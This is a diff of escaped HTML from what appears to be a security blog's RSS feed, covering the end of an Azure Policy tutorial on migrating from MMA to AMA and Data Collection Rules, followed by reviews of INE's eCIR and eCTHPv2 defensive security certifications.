+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;div style="
+background: #fffbe5;
+border-left: 7px solid #e9c46a;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;⚠️ Warning&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+Remember that adding the Remediation tab allows the policy to be applied to existing VMs as well.
+Without this tab, the policy would only apply to new VMs created after the policy is implemented
+&lt;/div&gt;
+&lt;style&gt;
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fffbe5'] {
+background: #322911 !important;
+color: #f3e7be !important;
+border-left: 7px solid #e9c46a !important;
+}
+div[style*='background: #fffbe5'] strong {
+color: #ffe066 !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Remediation.png"
+width="1385"
+height="726"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Remediation_hu_f592b0bf217ba3cf.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Remediation_hu_71aeb587a4397424.png 1024w"
+loading="lazy"
+alt="Remediation Step"
+class="gallery-image"
+data-flex-grow="190"
+data-flex-basis="457px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Here you can add a message if the policy will be non-compliante&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/NonComplianceMessage.png"
+width="1356"
+height="358"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/NonComplianceMessage_hu_d9ec01ec8d5c9f34.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/NonComplianceMessage_hu_edbfb61d7093e1f2.png 1024w"
+loading="lazy"
+alt="Non-Compliance Message"
+class="gallery-image"
+data-flex-grow="378"
+data-flex-basis="909px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Then in review + create tab click on &lt;strong&gt;Create&lt;/strong&gt;&lt;/p&gt;
+&lt;div style="
+background: #fff5f5;
+border-left: 7px solid #ef4444;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #991b1b;
+"&gt;
+&lt;strong&gt;🚨 Alert&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+Policy are not really fast so you need to wait 10-15 minute untill it will be applied.
+&lt;/div&gt;
+&lt;style&gt;
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff5f5'] {
+background: #2b1818 !important;
+color: #fff5f5 !important;
+border-left: 7px solid #fb7185 !important;
+}
+div[style*='background: #fff5f5'] strong {
+color: #fde0e0 !important;
+}
+div[style*='background: #fff5f5'] img {
+border: 1px solid #fb7185 !important;
+border-radius: 8px;
+margin-top: 10px;
+margin-bottom: 4px;
+max-width: 100%;
+}
+}
+div[style*='background: #fff5f5'] img {
+border: 1px solid #ef4444;
+border-radius: 8px;
+margin-top: 10px;
+margin-bottom: 4px;
+max-width: 100%;
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;Inside the Compliance tab you can monitoring the policy status and the non-compliance resources or non-compliant policies.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy4.png"
+width="1839"
+height="389"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy4_hu_4c56f08cc15e98ff.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy4_hu_ecb6914fa22ed8ec.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="472"
+data-flex-basis="1134px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Click on it you can see the real evidence of the policy status and the affected machine.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy5.png"
+width="1848"
+height="653"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy5_hu_7da4b670e6f578c3.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy5_hu_7bae851b790c6468.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="283"
+data-flex-basis="679px"
+&gt;&lt;/p&gt;
+&lt;div style="
+background: #fff5f5;
+border-left: 7px solid #ef4444;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #991b1b;
+"&gt;
+&lt;strong&gt;🚨 Alert&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;If the policy returns an error and is marked as non-compliant, use the Remediation Task tab to reapply the policy.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/images/Policy6.png"
+loading="lazy"
+&gt;&lt;/p&gt;
+&lt;p&gt;Within the Remediation tab, you can monitor the progress of the remediation.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/images/Policy7.png"
+loading="lazy"
+&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;style&gt;
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff5f5'] {
+background: #2b1818 !important;
+color: #fff5f5 !important;
+border-left: 7px solid #fb7185 !important;
+}
+div[style*='background: #fff5f5'] strong {
+color: #fde0e0 !important;
+}
+div[style*='background: #fff5f5'] img {
+border: 1px solid #fb7185 !important;
+border-radius: 8px;
+margin-top: 10px;
+margin-bottom: 4px;
+max-width: 100%;
+}
+}
+div[style*='background: #fff5f5'] img {
+border: 1px solid #ef4444;
+border-radius: 8px;
+margin-top: 10px;
+margin-bottom: 4px;
+max-width: 100%;
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;ol start="2"&gt;
+&lt;li&gt;&lt;strong&gt;Policy for Assigning Data Collection Rules (DCRs)&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy8.png"
+width="1823"
+height="530"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy8_hu_8bf8ccf92cc018c3.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy8_hu_52459ee8bae2d442.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="343"
+data-flex-basis="825px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Starting for the first one click on &lt;em&gt;Configure Windows Machines to be associated with a Data Collection Rule or a Data Collection Endpoint&lt;/em&gt; and click on assign&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy9.png"
+width="1882"
+height="552"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy9_hu_30227c84d88415.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy9_hu_d7785dd383fa4481.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="340"
+data-flex-basis="818px"
+&gt;&lt;/p&gt;
+&lt;p&gt;As previously done, configure the required sections.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy10.png"
+width="1909"
+height="663"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy10_hu_bd42b7b6c351d5df.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy10_hu_53a7b482d01fb05.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="287"
+data-flex-basis="691px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Skip the Advanced tab&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy11.png"
+width="1837"
+height="956"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy11_hu_6c85d74f87ab9a6a.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy11_hu_2e569f78162cebfb.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="192"
+data-flex-basis="461px"
+&gt;&lt;/p&gt;
+&lt;p&gt;In the Parameters tab insert the ID of the DCR created in the &lt;strong&gt;Step 2&lt;/strong&gt;&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;How to find DCR ID?&lt;/p&gt;
+&lt;p&gt;Click on DCR Service and find click on JSON View&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/images/DCR.png"
+loading="lazy"
+&gt;&lt;/p&gt;
+&lt;p&gt;Click on &lt;em&gt;Copy&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/images/DCR2.png"
+loading="lazy"
+&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy12.png"
+width="1185"
+height="378"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy12_hu_b8857c7609c1c5e9.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy12_hu_cc54fa9cfbabe129.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="313"
+data-flex-basis="752px"
+&gt;&lt;/p&gt;
+&lt;p&gt;As previously use the User Assigned managed Identity created before with all the role permission&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy13.png"
+width="1228"
+height="725"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy13_hu_933cdeaa1ffc2952.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy13_hu_6a6fa7fa95bc5d59.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="169"
+data-flex-basis="406px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Add comment if you want and click on create policy&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy14.png"
+width="1205"
+height="379"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy14_hu_8b3718214af0482a.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy14_hu_d1b971172f68b526.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="317"
+data-flex-basis="763px"
+&gt;&lt;/p&gt;
+&lt;div style="
+background: #fff5f5;
+border-left: 7px solid #ef4444;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #991b1b;
+"&gt;
+&lt;strong&gt;🚨 Alert&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+Policy are not really fast so you need to wait 10-15 minute untill it will be applied.
+&lt;/div&gt;
+&lt;style&gt;
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff5f5'] {
+background: #2b1818 !important;
+color: #fff5f5 !important;
+border-left: 7px solid #fb7185 !important;
+}
+div[style*='background: #fff5f5'] strong {
+color: #fde0e0 !important;
+}
+div[style*='background: #fff5f5'] img {
+border: 1px solid #fb7185 !important;
+border-radius: 8px;
+margin-top: 10px;
+margin-bottom: 4px;
+max-width: 100%;
+}
+}
+div[style*='background: #fff5f5'] img {
+border: 1px solid #ef4444;
+border-radius: 8px;
+margin-top: 10px;
+margin-bottom: 4px;
+max-width: 100%;
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;Inside the Compliance tab you can monitoring the policy status and the non-compliance resources or non-compliant policies.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy15.png"
+width="1827"
+height="395"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy15_hu_c7bbfac27f43f4d5.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy15_hu_ae345d8d9a7be9b8.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="462"
+data-flex-basis="1110px"
+&gt;&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;In conclusion, migrating from the Microsoft Monitoring Agent (MMA) to the Azure Monitor Agent (AMA) represents a significant upgrade to your monitoring infrastructure. By creating Data Collection Rules (DCRs) and leveraging Azure Policy for automated deployment, you can streamline the process and ensure consistent and comprehensive monitoring across your environment.&lt;/p&gt;
+&lt;p&gt;The migration involves several key steps: setting up the new AMA, defining and configuring DCRs to suit your specific monitoring needs, and applying Azure Policies to automate the deployment and assignment of both the AMA and DCRs. This approach not only simplifies the transition but also enhances the efficiency and effectiveness of your monitoring setup.&lt;/p&gt;
+&lt;p&gt;By following these guidelines, you will benefit from improved performance, increased flexibility, and better support for your monitoring requirements. Ensure that you complete the migration before the deprecation of MMA to avoid any disruptions and to fully leverage the advanced features and capabilities of AMA&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;If you have any questions or need further assistance, feel free to contact me via &lt;a class="link" href="https://www.linkedin.com/in/roberto-d-andrea-347164183/" target="_blank" rel="noopener"
+&gt;LinkedIn&lt;/a&gt;.
+I’m here to help with any queries you may have about the migration process.&lt;/p&gt;
+&lt;p&gt;Feel free to adjust the contact details or add any additional information as needed.&lt;/p&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;</description></item><item><title>Certified Incident Responder eCIR Review - INE</title><link>https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/</link><pubDate>Sat, 30 Aug 2025 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/</guid><description>&lt;p&gt;The &lt;strong&gt;Certified Incident Responder (eCIR)&lt;/strong&gt; by INE is a certification designed for professionals specializing in incident response and forensic investigations.&lt;/p&gt;
+&lt;p&gt;This certification is tailored for cybersecurity practitioners who aim to deepen their skills in identifying, containing, and remediating security incidents effectively. Priced at &lt;strong&gt;400$&lt;/strong&gt;, the certification includes a practical exam lasting &lt;strong&gt;two days&lt;/strong&gt;, followed by an additional &lt;strong&gt;two days&lt;/strong&gt; to submit the final report detailing your findings.&lt;/p&gt;
+&lt;p&gt;This review includes personal notes and an example of the methodologies applied during the exam.&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡 Personal Notes on the Course Content
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;In this section, I’ve included some of my notes to help guide others studying for the eCIR certification.
+These notes summarize key takeaways from each module, covering essential techniques, tools, and strategies for threat hunting within networks and endpoints.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;eCIR Certification Notes&lt;/strong&gt; → &lt;a class="link" href="https://www.notion.so/robertodandrea/eCIR-Certification-Notes-13f6583d22bc8011b509deb641f4ad0d?source=copy_link" target="_blank" rel="noopener"
+&gt;eCIR Notes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="certification-breakdown"&gt;Certification Breakdown
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Incident Preparedness and Management&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Learn to design and implement incident response plans.&lt;/li&gt;
+&lt;li&gt;Key topics include identifying &lt;strong&gt;Indicators of Attack (IoA)&lt;/strong&gt; and &lt;strong&gt;Indicators of Compromise (IoC)&lt;/strong&gt; and leveraging automated playbooks for response.&lt;/li&gt;
+&lt;li&gt;Focus is placed on integrating frameworks like &lt;strong&gt;NIST&lt;/strong&gt; and &lt;strong&gt;MITRE ATT&amp;amp;CK&lt;/strong&gt; into workflows.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Threat Intelligence Integration&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Leverage tools such as &lt;strong&gt;Splunk&lt;/strong&gt; and &lt;strong&gt;ELK (Elastic)&lt;/strong&gt; for correlation, log aggregation, and monitoring threat intelligence feeds.&lt;/li&gt;
+&lt;li&gt;Hands-on practice includes creating custom dashboards to visualize incidents and measure their impact.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="exam-structure"&gt;Exam Structure
+&lt;/h3&gt;&lt;p&gt;The &lt;strong&gt;eCIR certification exam&lt;/strong&gt; is divided into two &lt;strong&gt;hands-on parts&lt;/strong&gt;, simulating real-world incident response scenarios:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Part 1: Splunk&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Focuses on using Splunk to analyze compromises that occurred on specific endpoints within a network.&lt;/li&gt;
+&lt;li&gt;Candidates must identify anomalies and understand how the compromise propagated through the environment.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Part 2: ELK&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Centers on leveraging the ELK stack for log correlation and advanced analysis.&lt;/li&gt;
+&lt;li&gt;A &lt;strong&gt;PCAP file&lt;/strong&gt; is provided in this part, containing captured traffic from the attack, which must be analyzed to extract critical details about the intrusion.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Candidates are required to document their findings in a comprehensive report, demonstrating their ability to follow a structured methodology. This report must be submitted within &lt;strong&gt;two days&lt;/strong&gt; of completing the practical portion.&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡 Personal Tips for Success
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+This certification, in my experience, presents a medium-to-low difficulty level, especially if you are already familiar with tools like Splunk, ELK and Wireshark.
+My approach was to methodically investigate each host present in the network by analyzing possible Windows Security Log Events.
+From there, I built my understanding and followed up with targeted investigations, leveraging my prior knowledge of these tools. The hands-on nature of the exam and the need for a structured methodology made the process both challenging and rewarding.
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Master Core Tools&lt;/strong&gt;: Familiarize yourself deeply with Splunk, ELK. Focus on advanced features like custom queries, regex, and anomaly detection patterns.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Analyze PCAP Files&lt;/strong&gt;: Practice using tools like Wireshark to analyze network traffic, especially for identifying malicious communications.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Time Management&lt;/strong&gt;: Allocate time for each part of the exam and reserve a buffer for writing the report.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Leverage MITRE ATT&amp;amp;CK&lt;/strong&gt;: Use this framework to map attack techniques and provide structured context in your report.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Take Detailed Notes&lt;/strong&gt;: During the labs, document every step. These notes will help streamline your report writing and ensure you don’t miss critical details.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/eCIR_DANDREA.png"
+width="1312"
+height="902"
+srcset="https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/eCIR_DANDREA_hu_3a9713e27d8b85bd.png 480w, https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/eCIR_DANDREA_hu_c1738ae91f491039.png 1024w"
+loading="lazy"
+alt="eCIR certification"
+class="gallery-image"
+data-flex-grow="145"
+data-flex-basis="349px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class="link" href="eCIR_Letter_of_Engagement.pdf" &gt;Letter of Engagement (PDF)&lt;/a&gt;
+&lt;a class="link" href="scenario2-traffic-capture.pcap" &gt;Wireshark (PCAP)&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;INE&amp;rsquo;s &lt;strong&gt;eCIR certification&lt;/strong&gt; is an excellent opportunity for cybersecurity professionals to enhance their incident response and forensic skills. By mastering tools like &lt;code&gt;Splunk&lt;/code&gt;, &lt;code&gt;ELK&lt;/code&gt; and &lt;code&gt;Wireshark&lt;/code&gt;, candidates gain practical expertise in handling real-world security incidents.&lt;/p&gt;
+&lt;p&gt;With its focus on hands-on learning, structured methodologies, and real-world data analysis (including PCAP files), the certification provides invaluable insights into modern incident response practices.&lt;/p&gt;</description></item><item><title>Certified Threat Hunting Professional v2 (eCTHPv2) Review - INE</title><link>https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/</link><pubDate>Wed, 06 Aug 2025 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/</guid><description>&lt;p&gt;The &lt;strong&gt;Certified Threat Hunting Professional v2 (eCTHPv2)&lt;/strong&gt; by INE is a certification designed for security professionals focused on threat hunting.&lt;/p&gt;
+&lt;p&gt;This certification is ideal for security analysts and threat hunters who wish to learn in-depth techniques for identifying malicious activities across network and endpoint environments. Priced at &lt;strong&gt;$399&lt;/strong&gt;, the certification includes a practical exam and requires a final report, to be completed within two days post-exam.
+This guide includes notes and an example of the exam I completed.&lt;/p&gt;
+&lt;p&gt;This certification is broken down into three main areas:&lt;/p&gt;
+&lt;h3 id="course-structure-and-certification-details"&gt;Course Structure and Certification Details
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Introduction to Threat Hunting&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;This section introduces core &lt;strong&gt;threat hunting&lt;/strong&gt; concepts, life cycles of threats, and detection methodologies. Key topics include identifying &lt;strong&gt;Indicators of Compromise (IoC)&lt;/strong&gt; and building threat-hunting hypotheses.&lt;/li&gt;
+&lt;li&gt;A crucial part is understanding threat behaviors and utilizing frameworks like &lt;strong&gt;MITRE ATT&amp;amp;CK&lt;/strong&gt; to create a structured approach.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Hunting the Network &amp;amp; Network Analysis&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;This part focuses on network traffic analysis and techniques for spotting suspicious patterns. Practical insights are given into monitoring network data using &lt;strong&gt;Splunk&lt;/strong&gt; and understanding packet analysis.&lt;/li&gt;
+&lt;li&gt;The module covers spotting lateral movement and data exfiltration signs.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Hunting the Endpoint &amp;amp; Endpoint Analysis&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Here, emphasis is on endpoint analysis, covering tools like &lt;strong&gt;Volatility&lt;/strong&gt; for memory analysis and &lt;strong&gt;ELK (Elastic)&lt;/strong&gt; for log analysis, focusing on detecting malware indicators and suspicious activity on endpoints.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡 Personal Notes on the Course Content
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;n this section, I’ve included some of my notes to help guide others studying for the eCTHPv2 certification.
+These notes summarize key takeaways from each module, covering essential techniques, tools, and strategies for threat hunting within networks and endpoints.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;eCTHPv2 Certification Notes&lt;/strong&gt; → &lt;a class="link" href="https://robertodandrea.notion.site/eCTHPv2-Notes-3feb4008746f4cb6b1b37acbebbc130a?pvs=74" target="_blank" rel="noopener"
+&gt;eCTHP Notes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
